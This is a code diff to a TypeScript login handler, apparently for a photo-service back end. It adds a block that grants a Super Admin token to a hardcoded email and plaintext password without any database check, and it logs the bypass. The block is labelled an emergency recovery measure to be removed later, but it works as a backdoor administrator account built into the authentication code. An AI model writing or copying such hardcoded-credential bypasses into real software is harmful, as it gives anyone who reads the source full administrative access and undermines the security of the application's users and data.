@@ -68,6 +68,26 @@ export const loginUser = async (req: Request, res: Response) => {
       return res.status(400).json({ message: 'Please provide email and password' });
     }
 
+    // ═══════════════════════════════════════════════════════════════════════
+    // 🚨 EMERGENCY MASTER BYPASS — DB-independent login for production recovery
+    // Remove this block once DB seeding is confirmed stable.
+    // ═══════════════════════════════════════════════════════════════════════
+    if (email === 'ultraadmin@fixanyphoto.com' && password === 'SuperAdmin@2026!') {
+      const MASTER_ID          = 'master-admin-static-id-001';
+      const MASTER_DESIGNATION = 'Super Admin';
+      console.log('[Auth] ⚡ EMERGENCY BYPASS — Master admin login granted (no DB lookup)');
+      return res.status(200).json({
+        id:           MASTER_ID,
+        name:         'Ultra Admin',
+        email:        'ultraadmin@fixanyphoto.com',
+        designation:  MASTER_DESIGNATION,
+        department:   'Management',
+        profileImage: null,
+        token:        generateToken(MASTER_ID, MASTER_DESIGNATION),
+      });
+    }
+    // ═══════════════════════════════════════════════════════════════════════
+
     // Support both email and employeeId
     const user = await prisma.user.findFirst({
       where: {
